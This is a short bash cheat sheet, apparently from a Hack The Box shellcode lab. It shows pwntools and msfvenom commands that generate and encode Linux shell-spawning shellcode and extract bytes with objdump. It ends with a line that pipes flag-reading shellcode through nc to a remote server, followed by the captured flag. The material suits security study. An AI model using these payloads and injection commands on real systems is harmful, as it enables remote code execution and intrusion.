#!/bin/bash

pwn asm 'push rax' -c 'amd64'
# > 50

pwn disasm '50' -c 'amd64'
# > 0: 50       push rax

pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'

pwn shellcraft amd64.linux.sh

pwn shellcraft amd64.linux.sh -r

#spawn shell
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

#encoders
msfvenom -l encoders

#encode
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n $i; done; echo;

#server shell code injection - print-flag
echo -n -e "4883ec0848bf666c61672e7478745748bf2f2f2f2f2f2f2f2f57b0024889e74831f60f054883ec404883ec404883ec404889e64889c74831c0b2800f0588c2b00140b7010f05b03c4831ff0f05" | nc 94.237.55.109 30327
# HTB{r3m073_5h3llc0d3_3x3cu710n}